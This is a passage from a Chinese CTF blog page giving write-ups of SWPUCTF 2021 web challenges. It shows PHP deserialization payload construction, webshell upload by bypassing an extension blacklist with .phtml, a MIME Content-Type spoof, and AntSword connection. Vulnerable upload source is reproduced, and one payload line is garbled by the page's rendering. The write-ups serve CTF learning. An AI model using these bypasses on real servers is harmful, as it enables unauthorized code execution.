<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="P1kap1" href="http://yoursite.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="P1kap1" href="http://yoursite.com/atom.xml"><link rel="alternate" type="application/json" title="P1kap1" href="http://yoursite.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="懂不懂python的含金量啊,又坐牢了,我就是歪脖,反序列化好难"><link rel="canonical" href="http://yoursite.com/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/"><title>NSS题记-web篇 - 无敌的Web - 我想打CTF | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">NSS题记-web篇</h1><div class="meta"><span class="item" title="创建时间：2023-08-26 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-08-26T00:00:00+08:00">2023-08-26</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Clear Mind</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="/covers/2.png"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于 我想打CTF"><span itemprop="name">我想打CTF</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/CTF/web/" itemprop="item" rel="index" title="分类于 无敌的Web"><span itemprop="name">无敌的Web</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://yoursite.com/CTF/web/NSS%E9%A2%98%E8%AE%B0-web%E7%AF%87/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="p1kap1"><meta itemprop="description" content="东隅已逝，桑榆非晚, 明镜止水之心"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="P1kap1"></span><div class="body md" itemprop="articleBody"><h3 id="swpuctf-2021-新生赛ez_unserialize"><a class="anchor" href="#swpuctf-2021-新生赛ez_unserialize">#</a> [SWPUCTF 2021 新生赛] ez_unserialize</h3><blockquote><p>php，反序列化，文件泄露</p></blockquote><p>打开后是一张胡桃动图。</p><p>打开源码后发现一句注释：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="2"></td><td><pre>User<span class="token operator">-</span>agent<span class="token punctuation">:</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Disallow<span class="token punctuation">:</span> 什么东西呢？</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure><p>很熟悉的配方，于是查看 robots.txt 文件：</p><figure class="highlight txt"><figcaption data-lang="txt"></figcaption><table><tr><td data-num="1"></td><td><pre>User-agent: *</pre></td></tr><tr><td data-num="2"></td><td><pre>Disallow: /cl45s.php</pre></td></tr></table></figure><p>查看 cl45s.php 文件：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cl45s.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">wllm</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">=</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just a bit more!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>审计代码，发现函数在销毁时，如果 admin 等于 &quot;admin&quot;，password 等于 &quot;ctf&quot;，那么就可以输出 flag，于是构建参数：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">wllm</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">=</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just a bit more!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">wllm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token variable">$p</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token variable">$p</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>输入：</p><blockquote s:5:admin;s:5:admin;s:6:passwd;s:3:ctf;=""><p>?p=O:4:&quot;wllm&quot;:2:</p></blockquote><p>得到 flag。</p><h3 id="swpuctf-2021-新生赛easyupload20"><a class="anchor" href="#swpuctf-2021-新生赛easyupload20">#</a> [SWPUCTF 2021 新生赛] easyupload2.0</h3><blockquote><p>知识点：远程执行，php 的多种格式</p></blockquote><p>打开题目后发现要上传文件，于是上传一句话木马，发现不能上传，于是换了个格式 ——&quot;.phtml&quot;，上传成功，使用蚁剑连接。</p><p>获得 flag。</p><p>复盘</p><p>分析下源码</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>//index.php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">echo</span> <span class="token string double-quoted-string">"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>&lt;meta charset=\"utf-8\"></pre></td></tr><tr><td data-num="6"></td><td><pre>&lt;title>下手轻点，求求了&lt;/title></pre></td></tr><tr><td data-num="7"></td><td><pre>&lt;a>&lt;img src=\"https://gitee.com/a-sprite-of-84/docker-upload1/raw/master/images/upload1.jpg\" alt=\"upload1.jpg\" border=\"0\" />&lt;/a></pre></td></tr><tr><td data-num="8"></td><td><pre>&lt;form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\"></pre></td></tr><tr><td data-num="9"></td><td><pre>&lt;input type=\"file\" name=\"uploaded\" /></pre></td></tr><tr><td data-num="10"></td><td><pre>&lt;br/></pre></td></tr><tr><td data-num="11"></td><td><pre>&lt;input type=\"submit\" name=\"submit\" value=\"感觉要被秒了\" /></pre></td></tr><tr><td data-num="12"></td><td><pre>&lt;/form>"<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>//upload.php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">echo</span> <span class="token string double-quoted-string">"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>&lt;meta charset=\"utf-8\">"<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token variable">$target_path</span>  <span class="token operator">=</span>  <span class="token string double-quoted-string">"./upload"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token variable">$t_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre> </pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|hta|ini/i"</span><span class="token punctuation">,</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php是不行滴"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">else</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploaded_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$t_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$t_path</span><span class="token punctuation">&#125;</span></span> succesfully uploaded!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">else</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"不传🐎还想要f1ag?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>发现用正则表达式过滤了.php/.hta/.ini，因而除了 php 以外的 php 文件都可以上传；</p><p>另</p><p>php3，php5，pht，phtml，phps 都是 php 可运行的文件扩展名</p><h3 id="swpuctf-2021-新生赛easyupload10"><a class="anchor" href="#swpuctf-2021-新生赛easyupload10">#</a> [SWPUCTF 2021 新生赛] easyupload1.0</h3><blockquote><p>mime 绕过，文件上传，php，文件头绕过</p></blockquote><p>打开后是一个要求上传图片的界面，直接上传一句话木马，发现.php 文件被过滤了。</p><p>于是经过一番尝试后发现是 mine 检测。</p><blockquote><p>MIME: 客户端软件，区分不同种类的数据，例如 web 浏览器就是通过 MIME 类型来判断文件是 GIF 图片还是 PostScript 文件。web 浏览器使用 MIME 来说明发送数据的种类，web 服务端使用 MIME 来说明希望接收到的数据种类。</p></blockquote><blockquote><p>MIME 检测原理：服务端 MIME 类型检测是通过检查 http 包的 Content-Type 字段中的值来判断文件上传是否合法的。</p></blockquote><p>本题服务端只接受图片类型，因此可以用 burpsuit 抓包来修改文件类型，将其修改为</p><blockquote><p>Content-Type:image/jpeg</p></blockquote><p>文件成功上传后，用蚁剑进行连接。</p><p>连接成功后查看其中的文件，并未找到 flag 文件，可以回到网页，用 post 向参数传入</p><blockquote><p>phpinfo();</p></blockquote><p>最终在环境变量中找到 flag，或者在蚁剑中打开终端（右键），输入 php -i 命令。</p><p><strong>Content-Type 中常见的媒体格式类型：</strong></p><p><strong>以 text 开头的媒体格式类型：</strong></p><ul><li>text/html： HTML 格式。</li><li>text/plain：纯文本格式。</li><li>text/xml： XML 格式。</li></ul><p><strong>以 image 开头的媒体格式类型：</strong></p><ul><li>image/gif：gif 图片格式。</li><li>image/jpeg：jpg 图片格式。</li><li>image/png：png 图片格式。</li></ul><p><strong>以 application 开头的媒体格式类型：</strong></p><ul><li>application/xhtml+xml：XHTML 格式。</li><li>application/xml： XML 数据格式。</li><li>application/atom+xml：Atom XML 聚合格式 。</li><li>application/json： JSON 数据格式。</li><li>application/pdf：pdf 格式 。</li><li>application/msword： Word 文档格式。</li><li>application/octet-stream： 二进制流数据（如常见的文件下载）。</li><li>application/x-www-form-urlencoded： 中默认的 encType，form 表单数据被编码为 key/value 格式发送到服务器（表单默认的提交数据的格式）。</li></ul><p><strong>另外还有一种常见的媒体格式是上传文件之时使用的：</strong></p><ul><li>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式。</li></ul><p>以上就是我们在日常的开发中，经常会用到的若干 Content-Type 的内容格式。</p><h3 id="swpuctf-2021-新生赛no_wakeup"><a class="anchor" href="#swpuctf-2021-新生赛no_wakeup">#</a> [SWPUCTF 2021 新生赛] no_wakeup</h3><blockquote><p>php，反序列化，wakeup 函数绕过</p></blockquote><p>打开后是一道熟悉的代码审计：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">HaHaHa</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">public</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">=</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token 